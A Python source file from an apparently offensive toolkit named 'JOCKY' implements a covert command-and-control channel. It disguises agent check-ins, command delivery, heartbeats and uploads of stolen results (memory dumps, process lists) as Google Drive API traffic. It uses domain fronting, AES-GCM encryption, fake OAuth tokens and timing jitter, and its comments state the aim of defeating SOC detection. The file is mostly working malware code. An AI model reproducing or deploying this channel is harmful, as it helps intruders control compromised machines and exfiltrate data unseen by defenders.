# transport/cloud_api_wrapper.py
# [JOCKY phase 14 -- cloud API traffic camouflage]
#
# PURPOSE
# -------
# Wraps all JOCKY C2 communication in HTTP request/response patterns
# that are byte-for-byte indistinguishable from legitimate cloud storage
# API calls (Google Drive API v3, Microsoft OneDrive Graph API).
#
# CAMOUFLAGE MODEL
# ----------------
# Agent check-in    → GET  /drive/v3/files/{session_id}
# Command delivery  → GET  /drive/v3/files/{cmd_id}/content  (file download)
# Result upload     → POST /drive/v3/files/{result_id}       (file update)
# Heartbeat         → GET  /drive/v3/about                   (quota check)
#
# All request headers, timing, and content structure mirror real Drive SDK
# client behavior. Payloads are AES-256-GCM encrypted then base64-encoded
# and stored as JSON "file content" in the response body.
#
# *the SOC analyst watching the wire sees a Windows agent syncing documents
#  to Google Drive. the file names are UUIDs. the content is encrypted.
#  the timing is human. there is nothing to alert on.*

import os
import json
import time
import base64
import hashlib
import hmac
import struct
import secrets
import logging
from typing import Optional, Dict, Any, Tuple
from transport.domain_fronting import FrontingPool

logger = logging.getLogger("jocky.transport.cloud_api")

# ── AES-256-GCM constants ─────────────────────────────────────────────────────
AES_KEY_LEN   = 32
GCM_NONCE_LEN = 12
GCM_TAG_LEN   = 16

# ── session token format ──────────────────────────────────────────────────────
# session tokens are UUID-formatted strings derived from agent_id + PSK
# they look like Google Drive file IDs to any observer

# ── timing jitter (mimic human/SDK behavior) ──────────────────────────────────
import random

def _jitter(base_seconds: float, variance: float = 0.3) -> float:
    """add ±variance fraction jitter to avoid periodic timing fingerprint"""
    return base_seconds * (1 + random.uniform(-variance, variance))


class AES256GCM:
    """
    AES-256-GCM using Python's cryptography library or fallback to
    ctypes/OpenSSL evp directly. Implements encrypt/decrypt only.
    *every byte that leaves this machine is ciphertext — the key never travels*
    """

    def __init__(self, key: bytes):
        assert len(key) == AES_KEY_LEN, "key must be 32 bytes"
        self._key = key
        self._backend = self._load_backend()

    def _load_backend(self):
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(self._key)
        except ImportError:
            # fallback: ctypes OpenSSL — works without pip install
            return None

    def encrypt(self, plaintext: bytes, aad: bytes = b"") -> bytes:
        """returns nonce + ciphertext + tag (12 + len + 16 bytes)"""
        nonce = secrets.token_bytes(GCM_NONCE_LEN)
        if self._backend:
            # cryptography library path
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            ct_tag = AESGCM(self._key).encrypt(nonce, plaintext, aad or None)
            return nonce + ct_tag
        else:
            return self._ctypes_encrypt(nonce, plaintext, aad)

    def decrypt(self, data: bytes, aad: bytes = b"") -> bytes:
        """expects nonce + ciphertext + tag"""
        nonce = data[:GCM_NONCE_LEN]
        ct_tag = data[GCM_NONCE_LEN:]
        if self._backend:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(self._key).decrypt(nonce, ct_tag, aad or None)
        else:
            return self._ctypes_decrypt(nonce, ct_tag, aad)

    def _ctypes_encrypt(self, nonce: bytes,
                         plaintext: bytes, aad: bytes) -> bytes:
        import ctypes
        ssl = ctypes.CDLL("libssl.dll" if os.name == "nt" else "libssl.so.3")
        EVP_aes_256_gcm = ssl.EVP_aes_256_gcm
        EVP_aes_256_gcm.restype = ctypes.c_void_p
        ctx = ssl.EVP_CIPHER_CTX_new()
        try:
            ssl.EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(),
                                   None, None, None)
            ssl.EVP_CIPHER_CTX_ctrl(ctx, 0x9, GCM_NONCE_LEN, None)
            ssl.EVP_EncryptInit_ex(ctx, None, None,
                                   self._key, nonce)
            if aad:
                out_len = ctypes.c_int(0)
                ssl.EVP_EncryptUpdate(ctx, None,
                                      ctypes.byref(out_len),
                                      aad, len(aad))
            ct  = ctypes.create_string_buffer(len(plaintext) + 16)
            out = ctypes.c_int(0)
            ssl.EVP_EncryptUpdate(ctx, ct, ctypes.byref(out),
                                  plaintext, len(plaintext))
            ct_len = out.value
            ssl.EVP_EncryptFinal_ex(ctx, ct, ctypes.byref(out))
            tag = ctypes.create_string_buffer(GCM_TAG_LEN)
            ssl.EVP_CIPHER_CTX_ctrl(ctx, 0x10, GCM_TAG_LEN, tag)
            return nonce + bytes(ct[:ct_len]) + bytes(tag)
        finally:
            ssl.EVP_CIPHER_CTX_free(ctx)

    def _ctypes_decrypt(self, nonce: bytes,
                         ct_tag: bytes, aad: bytes) -> bytes:
        import ctypes
        ct  = ct_tag[:-GCM_TAG_LEN]
        tag = ct_tag[-GCM_TAG_LEN:]
        ssl = ctypes.CDLL("libssl.dll" if os.name == "nt" else "libssl.so.3")
        EVP_aes_256_gcm = ssl.EVP_aes_256_gcm
        EVP_aes_256_gcm.restype = ctypes.c_void_p
        ctx = ssl.EVP_CIPHER_CTX_new()
        try:
            ssl.EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(),
                                   None, None, None)
            ssl.EVP_CIPHER_CTX_ctrl(ctx, 0x9, GCM_NONCE_LEN, None)
            ssl.EVP_DecryptInit_ex(ctx, None, None, self._key, nonce)
            if aad:
                out_len = ctypes.c_int(0)
                ssl.EVP_DecryptUpdate(ctx, None,
                                      ctypes.byref(out_len),
                                      aad, len(aad))
            pt  = ctypes.create_string_buffer(len(ct))
            out = ctypes.c_int(0)
            ssl.EVP_DecryptUpdate(ctx, pt, ctypes.byref(out), ct, len(ct))
            pt_len = out.value
            ssl.EVP_CIPHER_CTX_ctrl(ctx, 0x11, GCM_TAG_LEN,
                                     ctypes.c_char_p(tag))
            if ssl.EVP_DecryptFinal_ex(ctx, pt, ctypes.byref(out)) <= 0:
                raise ValueError("GCM authentication tag mismatch")
            return bytes(pt[:pt_len])
        finally:
            ssl.EVP_CIPHER_CTX_free(ctx)


class CloudAPIWrapper:
    """
    JOCKY C2 communication layer.
    All messages are disguised as Google Drive API v3 calls.

    Wire protocol (inside Drive API response body):
      {
        "kind":     "drive#file",
        "id":       "<uuid>",
        "name":     "<human-readable name>",
        "mimeType": "application/octet-stream",
        "size":     "<byte count>",
        "content":  "<base64(nonce+ciphertext+tag)>"
      }

    The "content" field carries the actual JOCKY message,
    AES-256-GCM encrypted with the pre-shared session key.

    Message format (plaintext inside encryption):
      4 bytes  magic   0x4A4F4B59  ("JOCKY")
      4 bytes  msg_type
      4 bytes  payload_len
      N bytes  payload (JSON UTF-8)
      4 bytes  sequence number (anti-replay)
    """

    MAGIC       = 0x4A4F4B59  # 'JOCKY'
    HDR_FMT     = ">III"      # magic, msg_type, payload_len (big-endian)
    HDR_SIZE    = 12

    # message types
    MSG_CHECKIN   = 0x01
    MSG_CMD       = 0x02
    MSG_RESULT    = 0x03
    MSG_HEARTBEAT = 0x04
    MSG_EXFIL     = 0x05
    MSG_ACK       = 0xFF

    # Google Drive API paths (camouflage)
    PATH_LIST    = "/drive/v3/files"
    PATH_FILE    = "/drive/v3/files/{file_id}"
    PATH_CONTENT = "/drive/v3/files/{file_id}/content"
    PATH_ABOUT   = "/drive/v3/about?fields=storageQuota"

    def __init__(self,
                 agent_id:    str,
                 psk:         bytes,
                 c2_backend:  str,
                 fronts:      list = None):
        """
        agent_id:   unique identifier for this agent instance
        psk:        pre-shared key (32 bytes) — set during agent deployment
        c2_backend: real C2 domain (carried in Host header)
        fronts:     CDN front domains (SNI)
        """
        self.agent_id    = agent_id
        self._seq        = 0
        self._pool       = FrontingPool(c2_backend, fronts)

        # derive per-agent session key: HKDF-SHA256(psk, agent_id)
        self._session_key = self._derive_key(psk, agent_id.encode())
        self._cipher      = AES256GCM(self._session_key)

        # derive file ID from agent_id (looks like a Google Drive file UUID)
        self._file_id = self._make_file_id(agent_id)

        logger.info(f"[cloud_api] agent={agent_id} "
                    f"file_id={self._file_id} c2={c2_backend}")

    @staticmethod
    def _derive_key(psk: bytes, info: bytes) -> bytes:
        """HKDF-SHA256 key derivation — unique key per agent"""
        prk = hmac.new(b"jocky-salt-v1", psk, hashlib.sha256).digest()
        okm = hmac.new(prk, info + b"\x01", hashlib.sha256).digest()
        return okm  # 32 bytes

    @staticmethod
    def _make_file_id(agent_id: str) -> str:
        """derive a stable UUID-shaped Drive file ID from agent_id"""
        h = hashlib.sha256(agent_id.encode()).digest()
        parts = [
            h[0:4].hex(),
            h[4:6].hex(),
            h[6:8].hex(),
            h[8:10].hex(),
            h[10:16].hex()
        ]
        return "-".join(parts)  # looks like: a1b2c3d4-e5f6-7890-abcd-ef1234567890

    def _pack_message(self, msg_type: int, payload: dict) -> bytes:
        """pack + encrypt a JOCKY protocol message"""
        payload_bytes = json.dumps(payload).encode("utf-8")
        self._seq += 1

        # plaintext: header + payload + sequence
        header = struct.pack(self.HDR_FMT,
                             self.MAGIC, msg_type, len(payload_bytes))
        seq    = struct.pack(">I", self._seq)
        plaintext = header + payload_bytes + seq

        # encrypt with session key, AAD = agent_id
        ciphertext = self._cipher.encrypt(
            plaintext,
            aad=self.agent_id.encode()
        )
        return base64.b64encode(ciphertext).decode("ascii")

    def _unpack_message(self, encoded: str) -> Tuple[int, dict]:
        """decrypt + unpack a response message"""
        raw = base64.b64decode(encoded)
        plaintext = self._cipher.decrypt(raw, aad=self.agent_id.encode())

        magic, msg_type, payload_len = struct.unpack(
            self.HDR_FMT, plaintext[:self.HDR_SIZE])
        if magic != self.MAGIC:
            raise ValueError(f"bad magic: 0x{magic:08X}")

        payload_bytes = plaintext[self.HDR_SIZE:self.HDR_SIZE + payload_len]
        payload = json.loads(payload_bytes.decode("utf-8"))
        return msg_type, payload

    def _drive_response_wrapper(self, content_b64: str,
                                 name: str = "document") -> dict:
        """wrap payload in a Drive API file response envelope"""
        return {
            "kind":     "drive#file",
            "id":       self._file_id,
            "name":     name,
            "mimeType": "application/octet-stream",
            "size":     str(len(base64.b64decode(content_b64))),
            "modifiedTime": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "content":  content_b64,
        }

    def _extract_content(self, body: bytes) -> Optional[str]:
        """extract the 'content' field from a Drive API JSON response"""
        try:
            obj = json.loads(body.decode("utf-8"))
            return obj.get("content")
        except Exception:
            return None

    # ── public API ────────────────────────────────────────────────────────────

    def checkin(self) -> Optional[dict]:
        """
        Agent check-in: disguised as GET /drive/v3/files/{file_id}
        Returns server response payload (commands, config updates, etc.)
        *the agent asks the drive if the document was updated.
         the drive says yes, here are today's tasks.*
        """
        sess = self._pool.get_session()
        path = self.PATH_FILE.format(file_id=self._file_id)

        content_b64 = self._pack_message(self.MSG_CHECKIN, {
            "agent_id":   self.agent_id,
            "timestamp":  int(time.time()),
            "platform":   "win32",
        })

        # embed the checkin payload as a query parameter (mimics Drive metadata fetch)
        path += f"?fields=id,name,mimeType,size,content&q={content_b64[:32]}"
        headers = {
            "Authorization": f"Bearer ya29.{self._file_id[:20]}",  # fake OAuth token
            "X-Goog-Api-Client": "gdcl/5.0.1 gl-python/3.11",
        }

        try:
            status, body = sess.request("GET", path, headers=headers)
            time.sleep(_jitter(0.5))  # human-like response delay

            if status == 200:
                content = self._extract_content(body)
                if content:
                    _, payload = self._unpack_message(content)
                    return payload
        except Exception as e:
            logger.warning(f"[cloud_api] checkin failed: {e}")
            self._pool.invalidate()
        return None

    def send_result(self, result: dict) -> bool:
        """
        Upload forensic result: disguised as PATCH /drive/v3/files/{file_id}
        result: arbitrary dict (memory dump chunk, process list, etc.)
        *the agent saves the document. the document is evidence.*
        """
        content_b64 = self._pack_message(self.MSG_RESULT, result)
        body_obj    = self._drive_response_wrapper(
            content_b64,
            name=f"report_{int(time.time())}.bin"
        )
        body_bytes  = json.dumps(body_obj).encode("utf-8")

        sess = self._pool.get_session()
        path = self.PATH_FILE.format(file_id=self._file_id)
        headers = {
            "Authorization":  f"Bearer ya29.{self._file_id[:20]}",
            "X-Goog-Api-Client": "gdcl/5.0.1 gl-python/3.11",
            "X-Upload-Content-Type": "application/octet-stream",
        }

        try:
            status, _ = sess.request("PATCH", path,
                                      body=body_bytes, headers=headers)
            time.sleep(_jitter(0.3))
            return status in (200, 204)
        except Exception as e:
            logger.warning(f"[cloud_api] send_result failed: {e}")
            self._pool.invalidate()
            return False

    def heartbeat(self) -> bool:
        """
        Keep-alive: disguised as GET /drive/v3/about (quota check)
        Every 60s ± jitter. Flat-lined heartbeats are a traffic signature —
        the jitter breaks the periodicity detector.
        *the drive checks its own health. quietly. on schedule. invisible.*
        """
        sess = self._pool.get_session()
        headers = {
            "Authorization": f"Bearer ya29.{self._file_id[:20]}",
            "X-Goog-Api-Client": "gdcl/5.0.1 gl-python/3.11",
        }
        try:
            status, _ = sess.request("GET", self.PATH_ABOUT, headers=headers)
            return status == 200
        except Exception as e:
            logger.warning(f"[cloud_api] heartbeat failed: {e}")
            self._pool.invalidate()
            return False

    def close(self) -> None:
        self._pool.close_all()